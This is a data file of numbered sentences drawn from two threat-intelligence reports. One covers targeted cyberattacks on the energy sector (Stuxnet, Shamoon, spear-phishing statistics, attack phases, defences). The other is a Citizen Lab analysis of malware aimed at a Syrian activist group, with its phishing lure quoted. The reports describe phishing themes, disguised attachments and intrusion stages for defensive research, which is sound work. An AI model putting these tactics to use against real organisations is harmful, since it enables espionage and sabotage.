technology for photovoltaic research and wind turbines , or data on gas field exploration .", "6422": "Information such as this is of high value and can generate huge profits for attackers or their sponsors .", "6423": "The same information can also be misused for an act of sabotage .", "6424": "Many power utilities companies fear disruptive attacks the most , regardless of whether it is done by internal or external attackers .", "6425": "The energy sector has a high potential for critical disruption through sabotage attacks .", "6426": "Any interruption to the power grid would cause substantial chaos and cascading effects resulting in financial loss .", "6427": "In the past there have been quite a few attacks that included targets in the energy sector .", "6428": "Some of these were more focused , like Stuxnet , Duqu , Shamoon/Disttrack and Night Dragon .", "6429": "Others saw power companies targeted among many other sectors , such as Hidden Lynx , Nitro , Flamer , Net Traveler and Elderwood to name a few .", "6430": "One of the biggest examples , and a game changer for many organizations , was Stuxnet .", "6431": "This targeted sabotage attack , which is believed to have been aimed against uranium enrichment facilities in Iran , made clear what could be done through cyberattacks .", "6432": "For example , such a case happened in May 2013 , when a small fuel distribution company in North Carolina fell victim to a cyberheist that transferred US $ 800,000 from the company 's bank account .", "6433": "Such threats spread broadly and might impact any person , regardless of their employer .", "6434": "These attackers aim at infecting as many computers as possible in order to maximize their chances of profits .", "6435": "For this paper we focused on email data from targeted attacks between July 2012 and June 2013 .", "6436": "Even though watering holes are becoming more frequently used in targeted attacks , it is unfortunately quite difficult to reliably map these to individual campaigns .", "6437": "A blocked drive-by download attempt does not give any indication if it was a targeted attack or just general noise .", "6438": "In quite a few cases we see the same common malware , like Poison Ivy , being used by generic attackers and by targeted attacks .", "6439": "In such cases the sole difference between a sophisticated targeted attack and a generic one lies in the person commanding the malware .", "6440": "Historically most industrial control systems ( ICS ) and supervisory control and data acquisition ( SCADA ) systems were in separated networks not connected to the Internet or any other network .", "6441": "Unfortunately this security through segregation approach does not fully protect against cyberattacks .", "6442": "In reality , networks are rarely completely isolated .", "6443": "Often some configuration updates are periodically installed or log files are transferred .", "6444": "If systems are not directly connected , the method of choice for these types of interactions is usually through a USB stick or a non-permanent modem connection , which provides a way into the restricted networks .", "6445": "If networks are truly segregated , this would mean that there would be no software updates installed , leaving old vulnerabilities open .", "6446": "There are also issues around processes .", "6447": "For example , the revocation lists for digital certificates are seldom updated and therefore certificates which are no longer valid can not be checked properly and would still be accepted .", "6448": "With the increasing desire for connectivity now reaching industrial plants , many operators have started to connect their ICS to the Internet .", "6449": "New adapters can bridge to older technology which was never intended to be controlled over the Internet , allowing it to be connected easily .", "6450": "This allows for efficient centralized monitoring and , to some extent , remote control of equipment .", "6451": "Depending on the type of machinery controlled through the human-machine interface ( HMI ) of the ICS , not all modifications are possible .", "6452": "Some systems are physically connected in a pure read-only mode for monitoring .", "6453": "And even if they are fully connected , some turbines have physical limitations or emergency systems based on physical effects that can not be overridden by the digital controller .", "6454": "Thus , not all Hollywood scenarios of open flood gates or turbines that fly through the air are possible .", "6455": "In the future , more systems are going to implement the failsafe switches in software , opening up the vector for malware attacks .", "6456": "An additional source of concern is that some countries have started to open the energy market for smaller private contributors .", "6457": "This means that almost anyone can use mini power plants like water , wind or photovoltaic sites to feed energy back into the power grid .", "6458": "Often these operators do not have a full IT staff supporting the facilities at hand , which might lead to more vulnerable installations .", "6459": "Furthermore they may deploy new technology which might be untested and contain some unknown vulnerabilities .", "6460": "While these smaller sites make up only a small portion of the grid , new decentralized power input feeds are a challenge for the balance of the power grid as well and need to be carefully monitored .", "6461": "Small outages or changes can have a domino effect for the whole power grid .", "6462": "To increase the exposure of energy firms even further , sites like SHODAN , which is essentially a search engine for devices , enable anyone to easily find exposed controllers on the Internet .", "6463": "Of course not all of the industrial control systems connected to the Internet are critical systems or even real ones .", "6464": "Some researchers have started to create honey pot systems in order to study the attackers , which have apparently already attracted attackers like the Comment Crew/APT1 group , who have broken into these decoy systems .", "6465": "Smart grids and smart metering are bringing significant change to the world 's power systems .", "6466": "Experts predict that billions of smart meters and sensors will be installed worldwide over the next ten years .", "6467": "They enable utility companies to measure energy consumption at a more granular level , creating better flow patterns and enabling different prices for consumption based on the time of day and location .", "6468": "This development brings new opportunities , as well as new challenges .", "6469": "As with any connected infrastructure , it is important to secure the network and its endpoint on multiple levels .", "6470": "In addition to the issue of securing these devices , smart grids will produce a huge amount of data which , depending on regulations , will need to be kept for audits .", "6471": "Some of this data may be sensitive and could raise privacy concerns if not properly protected .", "6472": "This could easily grow to petabytes of data that needs to be safely stored and managed .", "6473": "It is beyond the scope of this paper to address all the challenges associated with smart grids and smart meters .", "6474": "Symantec has created a dedicated whitepaper for this topic : How to protect critical infrastructure , mitigate fraud and guarantee privacy .", "6475": "As a member of the CRISALIS project , Symantec is following these developments closely and is helping to secure critical infrastructure together with partners from academia and different industry sectors .", "6476": "There have been numerous cyberattacks against the energy sector over the past few years .", "6477": "Not all of them were the work of sophisticated attackers ; some incidents were just collateral damage caused by malware infections or bad configuration issues .", "6478": "These incidents highlight the fact that such attacks can happen and that they can have real life consequences .", "6479": "In 2013 part of the Austrian and German power grid nearly broke down after a control command was accidentally misdirected .", "6480": "It is believed that a status request command packet , which was broadcast from a German gas company as a test for their newly installed network branch , found its way into the systems of the Austrian energy power control and monitoring network .", "6481": "Once there , the message generated thousands of reply messages , which generated even more data packages , which in turn flooded the control network .", "6482": "To stop this self-inflicted DDoS attack , part of the monitoring and control network had to be isolated and disconnected .", "6483": "Fortunately the situation was resolved without any power outages .", "6484": "In some cases the attacker tried to extort money from the energy companies , threatening them with further blackouts .", "6485": "Fortunately the power plant was already offline due to maintenance and the installed secondary backup monitoring system was unaffected by the worm .", "6486": "Nevertheless the incident raised safety concerns .", "6487": "The attack was not too sophisticated as it was easily spotted .", "6488": "A small modification of the PLC code instead would probably have gone unnoticed for a long time .", "6489": "In 2001 an attack took place against California 's power distribution center , which controls the flow of electricity across California .", "6490": "Due to apparently poor security configuration , the attacker was able to compromise two Web servers that were part of a developer network and penetrate further from there .", "6491": "Fortunately the attackers were stopped before they managed to attack any systems which were tied into the transmission grid for the Western United States .", "6492": "According to Russian officials , the largest natural gas extraction company in the country was successfully attacked in 2000 .", "6493": "Through this switchboard , the flow for individual gas pipelines could have been modified , which would easily have caused widespread disruption .", "6494": "Aside from these incidents , there have also been a number of more serious and well-documented targeted attacks against the energy sector : The Stuxnet incident and its relatives Duqu , Flamer and Gauss are some of the most talked-about cases of targeted attacks .", "6495": "The first recorded appearance of what we now call Stuxnet version 0.5 was in November 2007 .", "6496": "Since then , a handful of different versions have been found and analyzed .", "6497": "Stuxnet 1.x is based on what is now known as the '' tilded '' platform ; whereas Stuxnet 0.5 is based on the Flamer framework .", "6498": "The code segments and programming style differ , which indicates that two different programming teams were most likely responsible for the different branches of Stuxnet .", "6499": "Thorough investigation into the mechanism and functions of this threat started in July 2010 .", "6500": "The most notable vulnerability is the Microsoft Windows Shortcut 'LNK/PIF ' Files Automatic File Execution Vulnerability ( CVE-2010-2568 ) , which allows it to auto-execute on USB drives .", "6501": "This was most likely the first infection vector used by Stuxnet .", "6502": "In the end , Stuxnet propagated further than its authors probably intended .", "6503": "We have monitored more than 40,000 infected IP addresses in 155 countries .", "6504": "Many of those systems are most likely just collateral damage and were not intended to be infected by the attackers .", "6505": "For example multiple computers at Chevron were infected by Stuxnet , without any damage being done .", "6506": "Stuxnet 's payload focused on PLCs , which are used to control different industrial components .", "6507": "The target of the Stuxnet operation is believed to be a uranium enrichment facility in Iran .", "6508": "Closing the valves at certain points in time would lead to an increase of pressure that could damage the equipment .", "6509": "By speeding the centrifuges up and slowing them down repeatedly , the output quality could be spoiled and the centrifuges themselves could be damaged .", "6510": "This minimized the collateral damage at other facilities and showed that the attackers had in-depth knowledge of the targeted uranium enrichment facilities .", "6511": "Operation Night Dragon , which was uncovered in 2010 , is a typical example of global oil companies being targeted , but this time not with the aim of disruption in mind .", "6512": "The attackers did not use any zero-day vulnerabilities during their attacks .", "6513": "Rather they used publicly available tools for each individual job .", "6514": "In August 2012 an extremely destructive cyberattack hit an estimated 30,000 computers at one of the largest oil producers of the world in Saudi Arabia .", "6515": "The W32.Disttrack malware used in this attack , also known as Shamoon , consists of three components : a dropper , a wiper and a reporter module .", "6516": "The wiper component is only activated when a hardcoded configuration date has been passed .", "6517": "This enables a coordinated , '' time bomb '' scenario .", "6518": "The malware does not contain any payload against ICS , like Stuxnet does for PLCs , and is not as sophisticated .", "6519": "According to the company , no computer related with the production or distribution of oil was affected , since the operational network is separated and specially protected .", "6520": "One group that claimed responsibility for the attack posted on Pastebin that it was an anti-oppression hacker group .", "6521": "The attack was prompted by disappointment with some of the regimes in the Middle East , the group said .", "6522": "True or not , this shows that it is not necessarily only state-sponsored attackers who are carrying out disruptive attacks .", "6523": "Sabotage attacks usually fall into the orbit of hacktivists , who seek attention rather than profit .", "6524": "Some sources reported that the attackers had help from insiders , which would explain the so far unclear infection vector .", "6525": "Soon after this attack became known , a Qatari gas company was attacked in a similar way .", "6526": "The attacks are simple to carry out .", "6527": "They often follow the same pattern , starting with a reconnaissance phase to gather all publicly available information .", "6528": "The last phase may also involve a disruption attack if the goal is sabotage .", "6529": "For a more detailed analysis of the attack phases , see Appendix C. A spear phishing attack consists of an email with either a malicious attachment or a link to a malicious website .", "6530": "Such emails are sent in bulk to a handful of key users .", "6531": "These waves are often repeated till enough people fall for the bait and compromise their computers .", "6532": "For analysis on the social engineering themes used , attack details and attachment types used , see Appendix A .", "6533": "Some of the spear phishing campaigns are smaller in scale and are focused on specific targets .", "6534": "For example , on January 1 , 2013 a global energy research company was targeted .", "6535": "All receiving email addresses started with a letter between G and R , covering half of the alphabet .", "6536": "Whether there was a second wave of emails using the other half of the alphabet or whether the attackers only got their hands on part of the address book remains unknown .", "6537": "All emails had either the subject line '' 2013 , Obama QE4 ! Merry Christmas ! '' or '' 2013 , Obama QE4 ! '' .", "6538": "It is common to see spear phishing attacks take place around holidays , as people are receiving more emails during these times and are less likely to perform due diligence while opening them .", "6539": "The same family of dropper has been used in previous targeted attacks against other sectors , indicating that a group with multiple interests is behind the attacks .", "6540": "A week later , on January 7 , 2013 , the group attacked the same company again .", "6541": "Seventy emails were sent to 58 individuals using either '' 2012-13 NFL Playoffs Schedule '' or '' Re : 2012-13 NFL Playoffs Schedule '' as a subject line .", "6542": "In this wave , the attackers used a similar AVP.dll to the one used before .", "6543": "In some of the emails , an additional CHM file with an old exploit was used in an effort to maximize the chances of a successful infection .", "6544": "After this second wave , the attack ceased .", "6545": "A global oil company , with offices around the world , had been under continuous attack for some time , but in September 2012 we noticed an upsurge in activity , with 34 times more suspicious emails than on average .", "6546": "This provided a clear indication that something suspicious was going on .", "6547": "At the end of this wave of emails , a hotel chain , a rental car company and two financial institutions were also targeted by the same attacker .", "6548": "This may have been an attempt to find further information that could be used in a future social engineering attack against the oil company .", "6549": "In total , 136 email accounts at the oil company were targeted .", "6550": "A regional sales manager in Greece received 412 emails over the 12 month period , with 155 different attachments .", "6551": "A HR person in the same country received the second largest amount of emails with 90 in total .", "6552": "Seventeen other people were targeted between 70 and 90 times , many in the same region .", "6553": "The rest of the targeted people received less than five emails each , in what seems to have been an undirected spraying in the hope that at least some would fall for the bait .", "6554": "Clearly the one person that received the highest volume of emails was deemed to be of high value to the attackers .", "6555": "Possible explanations for the attack could be that a competitor wanted to know more about some upcoming deal or details on the oil field exploration , but this would be highly speculative .", "6556": "Many of the emails came from the same country as the main targeted sales manager .", "6557": "None of them linked to third party sites for drive-by downloads .", "6558": "Of the attachments , 1,588 had a .exe", "6559": "extension .", "6560": "Of those , 842 had a .pdf.exe", "6561": "extension .", "6562": "The attackers did not use any zero-day exploits to drop a payload .", "6563": "Other sub-domains at the same free host and DNS service have been used by other groups to spread malware in the past .", "6564": "It is unknown if the attackers succeeded in their goal and if valuable information has been extracted .", "6565": "The attacks did not completely disappear , but the email volume decreased significantly to only a few emails per week afterwards .", "6566": "As with all targeted attacks , there are many different groups of attackers operating in this field .", "6567": "These attacks can not be attributed to only one group or geographical region .", "6568": "We have seen individuals , competitors , hacktivist groups and possible state sponsored agents carrying out attacks against energy companies .", "6569": "Some of the attacks have been purely opportunistic , seeking any valuable information available .", "6570": "Other campaigns look like they were planned over a lengthy period and carried out methodically with a clear goal in mind .", "6571": "The attackers tend to go after valuable information , including maps of new gas fields or research on efficient photovoltaic generators .", "6572": "This information can be of great value to competitors or nations that want to make progress in the same field .", "6573": "Another motivation for attackers is to profit from the information stolen by blackmailing the company .", "6574": "The same information can be used to carry out sabotage attacks designed to disrupt ICSs , as the energy sector is also a primary target for sabotage attacks which will not generate direct profit for the attacker .", "6575": "A competitor might be interested in generating bad press and bad customer experience for a rival company , in order to win some new clients .", "6576": "For example , in January 2013 a group claiming to be related to Anonymous posted access details for what they said were Israeli SCADA systems for power plants and other systems .", "6577": "Meanwhile , '' Operation Save the Arctic '' targeted multiple oil companies around the globe in protest against drilling plans in the Arctic .", "6578": "Disgruntled employees are also a source of attacks that should not be underestimated .", "6579": "With their knowhow about internal critical processes and systems they often know how to inflict serious damage .", "6580": "They may be able to perform system modifications that could go unnoticed for a long periods .", "6581": "For all regular client computers , the well-established best practice guidelines apply .", "6582": "These computers are often the first ones to be attacked .", "6583": "Once compromised , the attacker will use these computers and try to explore deeper into internal networks .", "6584": "Securing and hardening of deployed operating systems with a working strategy for patch deployment is important .", "6585": "Reoccurring security awareness training can help users to identify social engineering attempts and prevent them from falling victim to them in the first place .", "6586": "The company can perform penetration testing on Web and network applications but also on ICSs to identify and remedy any vulnerability .", "6587": "For examples Web applications should be tested against SQL injection attacks .", "6588": "This can also help confirm if applied polices are followed through , if the patch level is correct on all computers and if systems are compliant .", "6589": "Companies can monitor the Internet for information about attacks in the same vertical and apply lessons learned where possible .", "6590": "In addition , different layers of security products can help achieve better overall protection .", "6591": "\u2022 Security Information and Event Manager system ( SIEM ) : Using a SIEM can help correlate all related alerts in one place .", "6592": "This centralized view can be cross referenced with threat intelligence data to generate prioritization and an action plan .", "6593": "Painting the bigger picture of the overall security state can reveal previously unnoticed attacks .", "6594": "For example failed login attempts on internal servers could indicate a password breach .", "6595": "This includes logging of critical systems and synchronization of time among multiple systems .", "6596": "\u2022 Ingress and egress filtering : Filtering the network traffic with firewalls , content filters and IPS allows the control of data flows .", "6597": "This can prevent attackers from reaching internal systems .", "6598": "It is important to also monitor outbound traffic , as data exfiltration is a key point for cyberespionage .", "6599": "It should be noted that with the increased use of cloud services and mobile devices , some traffic might never pass through the company 's gateways .", "6600": "Where traffic blocking is too disruptive at least monitoring should be implemented .", "6601": "\u2022 Data loss prevention ( DLP ) : DLP solutions can track the access and flow of critical information and prevent it from leaving the company or encrypt it automatically .", "6602": "\u2022 Endpoint protection : Depending on the usage pattern of the computer , different solutions are available to protect the endpoint .", "6603": "Antivirus solution with proactive detection methods like behavioral analysis and reputation scanning can prevent unknown malware from installing itself .", "6604": "HIPS ( host based intrusion prevention systems ) , behavioral lockdown or whitelisting can protect computers from any kind of unwanted tampering without the need of constant updates .", "6605": "\u2022 System protection : For non-standard IT systems , hardening can increase the security .", "6606": "On industrial systems which are not often updated or that can not be updated , exploitation can be prevented with the help of lockdown solutions like Symantec Critical System Protection ( CSP ) .", "6607": "Through policies , only trusted system applications are allowed to run .", "6608": "ICS should be regularly checked and upgraded if new firmware exists .", "6609": "Where this is not possible HIPS and behavioral lockdown tools can be used to secure computers .", "6610": "\u2022 Email filtering : Proper email filtering can prevent many spear phishing attempts from reaching users .", "6611": "They can help minimize the risk of an untrained user falling for social engineering tricks .", "6612": "\u2022 Authentication : Some of the ICS contain hardcoded passwords and , wherever possible , these should be changed .", "6613": "ICS frequently use weakly authenticated protocols that allow for impersonation attacks .", "6614": "Where possible those authentication methods should be upgraded or at least closely monitored .", "6615": "Strong authentication or PKI should be used where applicable .", "6616": "Industrial control systems ( ICS ) should be specially protected and monitored .", "6617": "The control system and control network should be secured .", "6618": "Where possible , ICS should be separate from the Intranet .", "6619": "Isolating these networks alone is often not enough to protect the control network , but it can make it more difficult for attackers to succeed .", "6620": "For some systems it can make sense to have a plan to quickly disconnect or separate critical machines in the event of a detected cyberattack .", "6621": "Cyberespionage campaigns and sabotage attacks are becoming increasingly common , with countless threat actors attempting to gain a foothold in some of the best protected organizations .", "6622": "At this stage , roughly five targeted attacks per day are being mounted on firms in the energy sector .", "6623": "These attacks have become increasingly sophisticated , although the capabilities and tactics used by these threat actors vary considerably .", "6624": "In the second half of 2012 , the energy sector was the second most targeted with 16 percent of all the targeted attacks .", "6625": "This strong increase was mainly due to a large scale attack against one global oil company .", "6626": "In the first half of 2013 , the energy sector was ranked fifth with 7.6 percent of all attacks focused on this sector .", "6627": "In general we have observed that attackers are becoming more efficient and focusing on smaller operations that attract less attention .", "6628": "The attackers tend to go after valuable information \u2013 such as maps of a new gas field \u2013 but the sector is also a major target for sabotage attacks , which will not generate direct profit for the attacker .", "6629": "Such disruptive attacks do already happen and may lead to large financial losses .", "6630": "State sponsored agents , competitors , internal attackers or hacktivists are the most likely authors of such sabotage attacks .", "6631": "Fortunately , there have not been many successful sabotage attacks against energy companies to date .", "6632": "However , the increasing number of connected systems and centralized control for ICS systems means that the risk of attacks in the future will increase .", "6633": "Energy and utility companies need to be aware of these risks and plan accordingly to protect their valuable information as well as their ICS or SCADA networks .", "6634": "Social engineering is an essential part of spear phishing campaigns .", "6635": "A cleverly chosen , enticing message may prompt the user into opening an attachment .", "6636": "It is evident that most attackers are carefully selecting the themes that they use for their attacks .", "6637": "Some groups use real news stories and copy the text directly from the newspaper websites .", "6638": "Others try to appeal to personal hobbies in order to get the user 's attention .", "6639": "In the energy sector the most commonly used theme for spear phishing emails was money related ( e.g .", "6640": "'' Wage Data 2012 '' ) followed by sports related themes ( e.g .", "6641": "'' 2012-13 NFL Playoffs Schedule '' ) .", "6642": "In general any topic can be used in a social engineering attempt , which makes it even harder for regular users to spot the attacks .", "6643": "Here are a few examples of subject lines used , listed by category : In the last six month of 2012 the average number of targeted attacks observed per day was 87 ( with 14 in the energy sector ) .", "6644": "In the first six month of 2013 the average number decreased to 60 targeted attacks per day ( five in the energy sector ) .", "6645": "The spike in August and September 2012 is mostly related to a large scale attack against a global oil company .", "6646": "The increase in May 2013 was due to multiple attacks against financial services , public sector and IT service organizations .", "6647": "The government and public sector was quantitatively the most attacked sector , with 25.4 percent of all targeted attacks falling in this sector for the last half of 2012 and 24 percent for the first half of 2013 .", "6648": "The energy sector accounted for 7.6 percent of all targeted attacks , making it the fifth most targeted sector in the first six month of 2013 .", "6649": "This was a big decrease from 16.3 percent of all attacks in the last half of 2012 , when it was the second most attacked sector .", "6650": "This spike in 2012 is mainly due to a large attack campaign against a global oil company which took place in September 2012 .", "6651": "On average we saw 18.6 mail accounts being attacked for any given target company in the last half of 2012 ( 60.7 in the energy sector ) and 5.6 email accounts in the first half of 2013 ( 10 in the energy sector ) .", "6652": "Overall , we see a trend of the attacker conducting more focused attacks against fewer individuals .", "6653": "This generates less noise and the risk of getting noticed or discovered is smaller .", "6654": "These emails are sent in small bursts and then repeated against a changing target space till enough computers are compromised .", "6655": "Half of all the attachments analyzed used an extension that would run directly when double clicked .", "6656": "This old method is still the most common scheme used .", "6657": "Of all attachments analyzed , 38 percent were .exe", "6658": "and 12 percent were .src", "6659": "files .", "6660": "In total only 6 percent used double extensions like .pdf.exe", "6661": "to fool the user .", "6662": "It should also be noted that 23 percent were Microsoft Word documents using some exploit to execute custom code on the computer .", "6663": "There were also some more exotic extensions used like AutoIt scripts ( .au3", "6664": ") and ZX-Edit files ( .zed", "6665": ") , but these are the exception rather than the rule .", "6666": "It might be that the attackers tried to bypass some email filtering software by experimenting with different attachment types .", "6667": "Sometimes even older exploits like the Microsoft DirectX DirectShow Length Record Remote Code Execution Vulnerability ( CVE- 2009-1539 ) in .mp4", "6668": "files are still occasionally used .", "6669": "This indicates that either not all attackers have the knowhow to use newer exploits that are publicly available or they speculate that the target has not patched all computers .", "6670": "Some of the attackers do not seem to be too sophisticated .", "6671": "For example they used '' www .", "6672": "[ COMPANY-NAME ] .com.exe", "6673": "'' as an attachment name , clearly missing that the '' .com", "6674": "'' at the end would be sufficient to run it and the additional '' .exe", "6675": "'' was not needed .", "6676": "To identify a series of targeted attacks that are likely performed by the same individuals , we have used a novel attack attribution methodology named TRIAGE .", "6677": "Developed by Symantec Research Labs , TRIAGE is data mining software that relies on multi-criteria decision analysis and intelligent data fusion algorithms to reliably link different attacks to the same source .", "6678": "This framework has been developed in order to automate cyberintelligence tasks and reduce the time needed to get insights into organized cybercrime activities .", "6679": "By enabling rapid analysis of large security data sets , Symantec analysts can then quickly and more efficiently attribute various waves of cyberattacks to a specific attack campaign likely run by the same individuals .", "6680": "The TRIAGE framework was recently enhanced with novel visualizations thanks to VIS-SENSE , a European research project aiming at developing visual analytics technologies for network security applications .", "6681": "Since its original conception , TRIAGE has been successfully used to analyze the behavior of cybercriminals involved in various types of Internet attack activities , such as rogue antivirus websites , spam botnets operations , scam campaigns and targeted attacks performed via spear phishing emails .", "6682": "As with any other targeted attacks , attacks against the energy sector often follow the same pattern .", "6683": "It can be broken down in different phases of attack .", "6684": "It should be noted that we have seen attackers modify their behavior and exceptions from the norm and this is possible especially if the target company has special circumstances or security measures in place .", "6685": "During this phase the attacker tries to learn as much as possible about the targeted organization .", "6686": "Information sources often include social networks , job posting sites and press releases .", "6687": "This enables the attacker to learn the contact details of possible target individuals as well as context that can be used in social engineering scenarios .", "6688": "The attacker will often create a list of implemented security software used at the targeted company from whatever information is available .", "6689": "These investigations often start completely passively without any direct contact with the company , since there are many data sources publicly available .", "6690": "Subsequently the attacker can use more interaction if needed .", "6691": "Some attackers go through all the effort of creating a fake social media account and befriending key employees .", "6692": "After a period of small talk , to create a false sense of security , such a connection can then be used to pass on an infected document or find out about some key information .", "6693": "Depending on the targeted location , physical reconnaissance and eavesdropping may also be used .", "6694": "The actual break-in occurs during this phase .", "6695": "There are two main avenues of attack .", "6696": "For example the Hidden Lynx group stopped using a zero-day vulnerability in a large watering hole attack after Microsoft released details on the vulnerability .", "6697": "This helped to cover their activities and avoid unwanted attention .", "6698": "For more difficult targets , man-in-the-middle attacks can be used .", "6699": "Due to the complexity of such an attack , they are rarely used .", "6700": "Depending on the skills of the attacker and the time available , the attacker might also attack systems at the perimeter , such as Web servers , and try to break in from there .", "6701": "The malware used is not always sophisticated .", "6702": "In these cases the person behind the malware orchestrating the commands is what makes the difference between a targeted attack and a broad generic infection .", "6703": "Having said this , on very unique targets , we will often see the use of a specifically designed piece malware , such as in the case of Stuxnet .", "6704": "Depending on the protection measures implemented by the target , the attackers may also digitally sign their malware creation .", "6705": "In the past there have been quite a few cases where code signing certificates were stolen and later misused to sign malware in order to pass it unnoticed to high value targets .", "6706": "Once the attacker has a foothold on one system , the next step is to create a plan for lateral movement through the network until the interesting data is found .", "6707": "With watering hole attacks especially , it can happen that computers that were not targeted get infected .", "6708": "Infected computers need to be assessed by the attacker and , if necessary , removed to keep the profile , and with that the chances of exposure , low .", "6709": "Any account detail can be useful to them .", "6710": "Domain administrator passwords are of especially high value , as they can help greatly in moving further through the Intranet .", "6711": "Once new systems are identified the attacker will attempt to hop onto them as well .", "6712": "This can either be proprietary systems , such as the case of Trojan.Jokra in South Korea , or OS-specific , such as hijacking Windows Update , in the case of Flamer .", "6713": "Especially in cases of wiping attacks , such Trojan.Jokra , this is a very efficient way to disrupt as many computers as possible .", "6714": "The capture and exfiltration phases are not always present .", "6715": "If the sole goal of the attackers is to cause a disruption they may directly jump to a destructive payload .", "6716": "However , in most cases information is extracted first , which in turn allows the sabotage to be constructed more efficiently at a later phase .", "6717": "This can be done with different levels of sophistication .", "6718": "In addition to this , the amount of data sent and the timing can be chosen in a smart way .", "6719": "In some instances the infected computer might not have a direct connection to the Internet .", "6720": "This is when any destructive payload is launched .", "6721": "If the attackers are only after information this phase might not happen at all .", "6722": "The targets and the goals for disruption attacks can be very different , there is no such thing as one- size-fits-all for disruption attacks .", "6723": "For example , Stuxnet was tailored to attack a specific uranium enrichment facility and would not work against a different target .", "6724": "In recent times , wiper Trojans have been popular in attacks against the energy sector .", "6725": "This can happen on any operating systems and we have seen scripts for different UNIX flavors being used as well .", "6726": "Depending on the disaster recovery plan in place , these computers can be remotely recovered .", "6727": "However , there may still be an outage while the computers are being restored .", "6728": "by John Scott-Railton and Seth Hardy With the collaboration of Cyber Arabs .", "6729": "Media coverage : Associated Press , Forbes This report describes a malware attack with circumstantial links to the Islamic State in Iraq and Syria .", "6730": "In the interest of highlighting a developing threat , this post analyzes the attack and provides a list of Indicators of Compromise .", "6731": "A Syrian citizen media group critical of Islamic State of Iraq and Syria ( ISIS ) was recently targeted in a customized digital attack designed to unmask their location .", "6732": "The Syrian group , Raqqah is being Slaughtered Silently ( RSS ) , focuses its advocacy on documenting human rights abuses by ISIS elements occupying the city of Ar- Raqah .", "6733": "In response , ISIS forces in the city have reportedly targeted the group with house raids , kidnappings , and an alleged assassination .", "6734": "The group also faces online threats from ISIS and its supporters , including taunts that ISIS is spying on the group .", "6735": "Though we are unable to conclusively attribute the attack to ISIS or its supporters , a link to ISIS is plausible .", "6736": "The malware used in the attack differs substantially from campaigns linked to the Syrian regime , and the attack is focused against a group that is an active target of ISIS forces .", "6737": "As the Syrian Civil War continues , Syrian citizen journalists and nonviolent activists operate in an increasingly unsafe environment .", "6738": "The regime has never welcomed their work , and has often targeted them for arrest and detention , and a multi-year hacking campaign ( see Pro-Regime / Regime Linked Groups ) .", "6739": "Additionally , not all elements of the Syrian opposition have uniformly supported nonviolent activists and citizen journalists .", "6740": "More recently , in areas like Raqqah , nonviolent activists face a new and exceptionally grave threat : ISIS .", "6741": "A growing number of reports suggest that ISIS is systematically targeting groups that document atrocities , or that communicate with Western media and aid organizations , sometimes under the pretext of finding '' spies '' .", "6742": "Ar-Raqqah , the city in which the case study is located , is situated in northern Syria and continues to be a key conflict flashpoint of the Syrian Civil War .", "6743": "In the spring of 2013 , Islamists and Free Syrian Army ( FSA ) fighters took over Ar- Raqqah from regime forces .", "6744": "As ISIS gained momentum , they consolidated their control over the city , edging out FSA- affiliated groups through attacks , summary executions , and kidnappings against a range of groups , including ethnic and religious minorities .", "6745": "During 2014 , there were a number of reports-many unconfirmed-that ISIS confiscated smartphones and laptops from captured activists .", "6746": "According to Syrians who experienced these searches and spoke with one of the reports ' authors , ISIS sometimes extracts data from confiscated smartphones and laptops to collect information about people and groups they are targeting , as well as to seek evidence of '' un-Islamic '' activities .", "6747": "As ISIS cements their control of Ar-Raqqah and other territories , reports have emerged recently ( though not all of them confirmed ) suggesting that elements within ISIS are growing increasingly sophisticated at imposing control and targeting opponents using digital methods .", "6748": "Reports about ISIS targeting Internet caf\u00e9s have grown increasingly common , and in some cases reports point to the possible use of keyloggers as well as unspecified '' IP sniffers '' to track behaviour in Internet cafes .", "6749": "Nonviolent activists and citizen journalists based in Ar-Raqqah have provided the outside world with much of what we know about how ISIS treats the population .", "6750": "These activists and journalists face mortal danger for their actions , and reports have emerged of their detention and torture at the hands of ISIS .", "6751": "As ISIS continues to use social media to push the message that it is welcomed by the population of Ar-Raqqah , groups like Raqqah is being Slaughtered Silently ( RSS ) provide a compelling counter narrative .", "6752": "RSS has n't escaped ISIS ' notice , and the group has been targeted for kidnappings , house raids , and at least one alleged targeted killing .", "6753": "At the time of writing , ISIS is allegedly holding several citizen journalists in Ar-Raqqah .", "6754": "In addition , RSS is targeted online by ISIS supporters with harassment , including threats to the physical safety of its members .", "6755": "For example , ISIS supporters have claimed that ISIS has established a system of CCTV cameras in Ar-Raqqah to observe residents ' movements .", "6756": "While this claim may be a bluff or exaggeration , at least one ISIS supporter has indicated on social media that this system could be used to look for members of RSS .", "6757": "The Citizen Lab analyzed this attack with the consent of RSS , which requested that their name be used in this report .", "6758": "The message was carefully worded , and contained references specific to the work and interests of RSS .", "6759": "Thank you for your efforts to deliver a true picture of the reality of life in Raqqah .", "6760": "As Syrians residing in Canada we are working with media because we believe in the importance of shedding light on the realities of life in Syria , and Raqqah in particular .", "6761": "We are preparing a lengthy news report on the realities of life in Raqqah .", "6762": "We are sharing some information with you with the hope that you will correct it in case it contains errors .", "6763": "We have prepared a map of the city of Raqqah , in addition to a preliminary report .", "6764": "We hope that you have a look at it with them and inform us of any errors .", "6765": "We also hope that if you happen to be on Facebook , you could provide us with the account of the person responsible for the campaign , if you do n't mind , so that we can communicate with him directly .", "6766": "You can see a preliminary copy of the report on this linkhttp : //tempsend [ DOT ] com/ [ Redacted ] With all respect [ Name Redacted ] We are unsure why the attacker specifically mentions Canada in the email lure .", "6767": "However , it is well known that Syria's extensive diaspora ( including in Canada ) regularly engages in advocacy , sometimes in coordination with groups within Syria .", "6768": "Thus , the message is not on its face implausible .", "6769": "This functionality would be especially useful to an adversary unsure of whether it can maintain uninterrupted Internet connectivity .", "6770": "Accessing the link provided in the malicious e-mail sends the user to a .zip", "6771": "file hosted on file-sharing site tempsend.com .", "6772": "At the time of writing the file had been downloaded only 10 times This file is a self-extracting archive with an icon intended to suggest to the victim that it is itself a slideshow .", "6773": "When run , the file opens a slideshow of Google Earth screen captures to the victim , displaying a series of locations in Syria , and highlighting an '' ISIS HQ '' and other images showing the alleged locations of US airstrikes .", "6774": "Programs appear to make use of the Visual C++ Runtime Library .", "6775": "Detections were low when the file was first submitted to VirusTotal , for example .", "6776": "The malware has no obfuscation processes and is not highly technical in its development or interaction with Windows .", "6777": "However , the attacker has not correctly implemented encrypted e-mail : the malware will not attempt to use a TLS connection in certain cases .", "6778": "As a result , account login credentials may be readily available in network traffic .", "6779": "The password for the zipped file is also present in the binary without encryption or obfuscation .", "6780": "Citizen Lab researchers have developed the Targeted Threat Index ( TTI ) as a tool to standardize information about the sophistication of targeted threats against civil society groups in our research .", "6781": "The index captures information about the level of social engineering used ( '' Targeting Sophistication '' 